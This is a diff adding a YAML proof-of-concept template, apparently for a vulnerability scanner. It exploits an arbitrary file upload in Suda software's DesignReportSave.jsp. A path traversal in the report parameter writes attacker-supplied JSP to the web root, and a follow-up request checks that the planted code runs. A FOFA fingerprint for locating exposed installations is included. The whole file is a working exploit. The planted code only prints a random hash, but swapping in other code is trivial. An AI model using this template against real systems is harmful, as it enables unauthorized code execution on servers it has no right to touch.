@@ -1,0 +1,22 @@
+id: poc-yaml-su-da-ruan-jian-designreportsave-jsp-anyfile-upload
+info:
+  name: 速达软件产品任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 速达软件
+  fofa: app="速达软件-公司产品"
+variables:
+  t1: random_str(4)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /report/DesignReportSave.jsp?report=../{{.t1}}.jsp
+  headers:
+    Content-Type: application/octet-stream
+  data: <% out.print("{{.t2}}");%>
+  expression: status_code == 200 && contains(body,"")
+- method: GET
+  path: /{{.t1}}.jsp
+  expression: status_code == 200 && body == t2
+transport: http
